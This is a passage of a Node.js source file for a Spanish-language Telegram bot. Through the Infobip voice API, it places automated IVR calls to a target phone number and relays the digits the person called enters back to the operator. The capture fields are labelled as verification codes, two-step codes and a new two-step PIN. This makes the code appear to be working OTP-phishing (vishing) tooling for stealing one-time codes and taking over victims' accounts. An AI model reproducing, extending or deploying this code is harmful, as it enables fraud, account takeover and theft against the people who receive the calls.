  if (step.type === "collect") {
    if (input.length !== step.digits || !/^\d+$/.test(input)) {
      ctx.reply(`⚠️ Debes ingresar exactamente ${step.digits} dígito${step.digits > 1 ? "s" : ""}. Intenta de nuevo.`); return;
    }
    ctx.reply(`✅ _(Capturado: ${step.label} = ${input})_`, { parse_mode: "Markdown" });
    awaitingInput[chatId] = { ...state, stepIndex: state.stepIndex + 1, waitingInput: false, currentStep: null };
    setTimeout(() => runSim(ctx, chatId), 300);

  } else if (step.type === "menu") {
    const validKeys = step.options.map(o => o.key);
    if (!validKeys.includes(input)) {
      ctx.reply(`⚠️ Tecla inválida. Opciones: ${validKeys.join(", ")}`); return;
    }
    const chosen = step.options.find(o => o.key === input);
    ctx.reply(`✅ _(Presionaste ${input} → ${chosen.label})_`, { parse_mode: "Markdown" });

    // Insertar pasos de la rama
    let newSteps = [...state.steps];
    if (chosen.steps && chosen.steps.length > 0) {
      newSteps.splice(state.stepIndex + 1, 0, ...chosen.steps);
    }
    awaitingInput[chatId] = { ...state, steps: newSteps, stepIndex: state.stepIndex + 1, waitingInput: false, currentStep: null };
    setTimeout(() => runSim(ctx, chatId), 300);
  }
}

// =========================
// LLAMADA
// =========================
function initiateCallWithSteps(chatId, targetNumber, fromNumber, steps, scriptName) {
  bot.telegram.sendMessage(chatId, "⏳ Preparando la llamada...");
  const apiKey = getUserApiKey(chatId);
  const host = getInfobipHost(chatId);

  const payload = {
    name: scriptName.substring(0, 50),
    description: `Guión: ${scriptName}`,
    script: buildIVRScript(steps, fromNumber, targetNumber)
  };

  const options = {
    method: "POST", hostname: host, path: "/voice/ivr/1/scenarios",
    headers: { Authorization: apiKey, "Content-Type": "application/json", Accept: "application/json" },
    maxRedirects: 20
  };

  const req = https.request(options, (res) => {
    let chunks = [];
    res.on("data", c => chunks.push(c));
    res.on("end", () => {
      try {
        const json = JSON.parse(Buffer.concat(chunks).toString());
        if (json && json.id) {
          sendCall(chatId, json.id, targetNumber, fromNumber, host, apiKey);
        } else {
          bot.telegram.sendMessage(chatId, `❌ Error al crear el guión: ${JSON.stringify(json)}`);
        }
      } catch (e) { bot.telegram.sendMessage(chatId, `❌ Error: ${e.message}`); }
    });
  });
  req.on("error", e => bot.telegram.sendMessage(chatId, `❌ Error: ${e.message}`));
  req.write(JSON.stringify(payload));
  req.end();
}

function sendCall(chatId, scenarioId, targetNumber, fromNumber, host, apiKey) {
  callRequests[scenarioId] = chatId;
  const clean = targetNumber.replace(/^\+/, "");
  callRequestsByNumber[clean] = { chatId, fromNumber, toNumber: targetNumber };
  callRequestsByNumber["+" + clean] = { chatId, fromNumber, toNumber: targetNumber };

  const payload = {
    bulkId: "BULK-" + Date.now(),
    messages: [{
      scenarioId, from: fromNumber,
      destinations: [{ to: targetNumber }],
      retry: { minPeriod: 1, maxPeriod: 5, maxCount: 5 },
      record: false,
      deliveryTimeWindow: { from: { hour: 0, minute: 0 }, to: { hour: 23, minute: 59 }, days: ["MONDAY","TUESDAY","WEDNESDAY","THURSDAY","FRIDAY","SATURDAY","SUNDAY"] },
      callbackUrl: WEBHOOK
    }]
  };

  bot.telegram.sendMessage(chatId, "🚀 Enviando llamada...");
  const options = {
    method: "POST", hostname: host, path: "/voice/ivr/1/messages",
    headers: { Authorization: apiKey, "Content-Type": "application/json", Accept: "application/json" },
    maxRedirects: 20
  };
  const req = https.request(options, (res) => {
    let chunks = [];
    res.on("data", c => chunks.push(c));
    res.on("end", () => {
      try {
        const json = JSON.parse(Buffer.concat(chunks).toString());
        if (json.bulkId) {
          bot.telegram.sendMessage(chatId, `✅ ¡Llamada enviada!\n📋 ID: ${json.bulkId}`);
        } else {
          bot.telegram.sendMessage(chatId, `📨 Respuesta: ${Buffer.concat(chunks).toString()}`);
        }
      } catch { bot.telegram.sendMessage(chatId, `📨 Respuesta: ${Buffer.concat(chunks).toString()}`); }
    });
  });
  req.on("error", e => bot.telegram.sendMessage(chatId, `❌ Error: ${e.message}`));
  req.write(JSON.stringify(payload));
  req.end();
}

// =========================
// WEBHOOK
// =========================
const app = express();
app.use(bodyParser.json());

function extractScenarioId(event) {
  return (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.scenarioId) || event.scenarioId || null;
}
function resolveChatId(scenarioId, toNumber) {
  if (scenarioId && callRequests[scenarioId]) return callRequests[scenarioId];
  if (toNumber) {
    const clean = String(toNumber).replace(/^\+/, "");
    const entry = callRequestsByNumber[clean] || callRequestsByNumber["+" + clean];
    if (entry) return entry.chatId;
  }
  return null;
}
function notifyTelegram(scenarioId, msg, toNumber) {
  const chatId = resolveChatId(scenarioId, toNumber);
  if (chatId) {
    bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" }).catch(console.error);
  } else {
    Object.entries(authenticatedUsers).forEach(([id, u]) => {
      if (u.authenticated && u.admin) bot.telegram.sendMessage(id, msg, { parse_mode: "Markdown" }).catch(console.error);
    });
  }
}
function cleanupCall(scenarioId, toNumber) {
  if (scenarioId) delete callRequests[scenarioId];
  if (toNumber) {
    const clean = String(toNumber).replace(/^\+/, "");
    delete callRequestsByNumber[clean];
    delete callRequestsByNumber["+" + clean];
    answeredCalls.delete(clean);
  }
}

app.post("/infobip-webhook", (req, res) => {
  console.log("Webhook:", JSON.stringify(req.body, null, 2));
  const payload = req.body;

  const handleEvent = (event) => {
    const scenarioId = extractScenarioId(event);
    const toNumber = event.to || (event.voiceCall && event.voiceCall.to) || null;
    const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
    const ts = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });

    if (event.type === "CALL_ANSWERED" && toNumber) answeredCalls.add(String(toNumber).replace(/^\+/, ""));

    if (!event.type && event.voiceCall) {
      const toNum = toNumber ? String(toNumber).replace(/^\+/, "") : null;
      const answered = toNum && answeredCalls.has(toNum);
      if (!answered) {
        notifyTelegram(scenarioId, `📵 *NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(toNumber)}\n🕐 ${ts}`, toNumber);
      } else {
        notifyTelegram(scenarioId, processEvent(event), toNumber);
      }
      cleanupCall(scenarioId, toNumber); return;
    }
    notifyTelegram(scenarioId, processEvent(event), toNumber);
  };

  if (payload.results && Array.isArray(payload.results)) payload.results.forEach(handleEvent);
  else handleEvent(payload);
  res.sendStatus(200);
});

function processEvent(event) {
  const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
  const to = event.to || (event.voiceCall && event.voiceCall.to) || "?";
  const ts = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });

  if (event.type) {
    switch (event.type) {
      case "CALL_ANSWERED": return `✅ *¡CONTESTÓ!*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${ts}`;
      case "CALL_FINISHED": return `📵 *LLAMADA FINALIZADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${ts}`;
      case "CALL_FAILED": case "NO_ANSWER": case "CALL_NO_ANSWER": return `❌ *NO CONTESTÓ / FALLÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${ts}`;
      case "CALL_REJECTED": case "BUSY": return `🚫 *RECHAZÓ LA LLAMADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${ts}`;
      case "CALL_STARTED": case "STARTED": return `📲 *LLAMADA INICIADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${ts}`;
      case "CALL_RINGING": case "RINGING": return `🔔 *LLAMANDO...*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${ts}`;
      case "DTMF_CAPTURED": {
        const label = event.label || event.field || "Dato";
        return `🔢 *${label}: ${event.value}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${ts}`;
      }
      default: return `ℹ️ *${event.type}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${ts}`;
    }
  } else if (event.voiceCall && event.voiceCall.ivr) {
    const vc = event.voiceCall;
    const duration = vc.duration || 0;
    const mins = Math.floor(duration / 60);
    const secs = duration % 60;
    const answered = !!vc.answerTime;
    const answerTime = vc.answerTime ? new Date(vc.answerTime).toLocaleString("es-CO", { timeZone: "America/Bogota" }) : null;
    const endTime = vc.endTime ? new Date(vc.endTime).toLocaleString("es-CO", { timeZone: "America/Bogota" }) : ts;

    let msg = answered
      ? `📋 *RESUMEN DE LLAMADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🟢 Contestó: ${answerTime}\n🔴 Finalizó: ${endTime}\n⏱️ Duración: ${mins}m ${secs}s`
      : `❌ *NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${endTime}`;

    if (vc.ivr.collectedDtmfs) {
      try {
        const d = JSON.parse(vc.ivr.collectedDtmfs);
        const known = ["initialOption","verificationCode","twoStepOption","twoStepCode","newTwoStepPin"];
        const labels = { initialOption: "Opción inicial", verificationCode: "🔑 Código", twoStepOption: "Opción dos pasos", twoStepCode: "🔐 Código dos pasos", newTwoStepPin: "📌 Nuevo PIN" };
        msg += "\n\n*Datos capturados:*";
        Object.keys(d).forEach(k => {
          if (d[k] && d[k] !== "null" && d[k] !== "") {
            msg += `\n🔹 ${labels[k] || k}: ${d[k]}`;
          }
        });
      } catch {}
    }
    return msg;
  }
  return `ℹ️ *Evento recibido*\n🕐 ${ts}`;
}

// =========================
// INICIO
// =========================
app.listen(PORT, () => console.log(`Servidor en puerto ${PORT}`));

function launchBot(retries = 5) {
  bot.launch()
    .then(() => console.log("✅ Bot iniciado."))
    .catch((err) => {
      if (err.response && err.response.error_code === 409 && retries > 0) {
        const delay = (6 - retries) * 3000;
        console.warn(`⚠️ Conflicto 409. Reintentando en ${delay / 1000}s...`);
        setTimeout(() => launchBot(retries - 1), delay);
      } else { console.error("❌ Error:", err.message); }
    });
}
launchBot();
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
